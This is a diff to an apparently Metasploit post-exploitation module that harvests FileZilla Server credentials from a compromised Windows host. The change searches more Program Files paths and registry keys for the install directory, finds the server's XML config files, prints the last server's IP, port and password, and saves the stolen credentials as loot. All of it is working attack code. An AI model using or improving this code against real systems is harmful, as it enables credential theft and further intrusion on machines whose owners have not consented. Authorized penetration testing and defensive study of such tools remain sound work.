@@ -37,34 +37,58 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    @progs = "#{session.sys.config.getenv('ProgramFiles')}\\"
+    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
+    locations = []
+    progfiles_env.each do |k, v|
+      next if v.blank?
+      locations << v + "\\FileZilla Server\\"
+    end
 
-    filezilla = check_filezilla
+    begin
+      root_key, base_key = session.sys.registry.splitkey("HKLM\\SOFTWARE\\FileZilla Server")
+      open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
+      locations << open_key.query_value("install_dir").data + "\\"
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
+    end
+
+    begin
+      root_key, base_key = session.sys.registry.splitkey("HKLM\\SOFTWARE\\Wow6432Node\\FileZilla Server")
+      open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
+      locations << open_key.query_value("install_dir").data + "\\"
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
+    end
+
+
+    locations = locations.uniq
+    filezilla = check_filezilla(locations)
     get_filezilla_creds(filezilla) if filezilla
   end
 
 
-  def check_filezilla
+  def check_filezilla(locations)
     paths = []
-    path = @progs + "FileZilla Server\\"
-
-    print_status("Checking for Filezilla Server directory in: #{path}")
-
     begin
-      session.fs.dir.entries(path)
+      locations.each do |location|
+        print_status("Checking for Filezilla Server directory in: #{location}")
+        begin
+          session.fs.dir.foreach("#{location}") do |fdir|
+            ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do |xmlfile|
+              if fdir == xmlfile
+                filepath = location + xmlfile
+                print_status("Configuration file found: #{filepath}")
+                paths << filepath
+              end
+            end
+          end
+        rescue Rex::Post::Meterpreter::RequestError => e
+          vprint_error(e.message)
+        end
+      end
     rescue ::Exception => e
       print_error(e.to_s)
       return
-    end
-
-    session.fs.dir.foreach(path) do |fdir|
-      ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do |xmlfile|
-        if fdir == xmlfile
-          filepath = path + xmlfile
-          vprint_status("Configuration file found: #{filepath}")
-          paths << filepath
-        end
-      end
     end
 
     if !paths.empty?
@@ -249,16 +273,18 @@ class Metasploit3 < Msf::Post
     configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'],
       config['admin_pass'], config['ssl'], config['ssl_certfile'], config['ssl_keypass']]
 
+    begin
+      lastser = parse_interface(fsi_xml)
+      lastserver << [lastser['ip'], lastser['port'], lastser['password']]
+      vprint_status("Last Server Information:")
+      vprint_status("         IP: #{lastser['ip']}")
+      vprint_status("       Port: #{lastser['port']}")
+      vprint_status("   Password: #{lastser['password']}")
+      vprint_line
 
-    lastser = parse_interface(fsi_xml)
-    lastserver << [lastser['ip'], lastser['port'], lastser['password']]
-
-    vprint_status("Last Server Information:")
-    vprint_status("         IP: #{lastser['ip']}")
-    vprint_status("       Port: #{lastser['port']}")
-    vprint_status("   Password: #{lastser['password']}")
-    vprint_line
-
+    rescue
+      vprint_error("Could not parse FileZilla Server Interface.xml")
+    end
     p = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
       "filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
     print_status("Credentials saved in: #{p.to_s}")
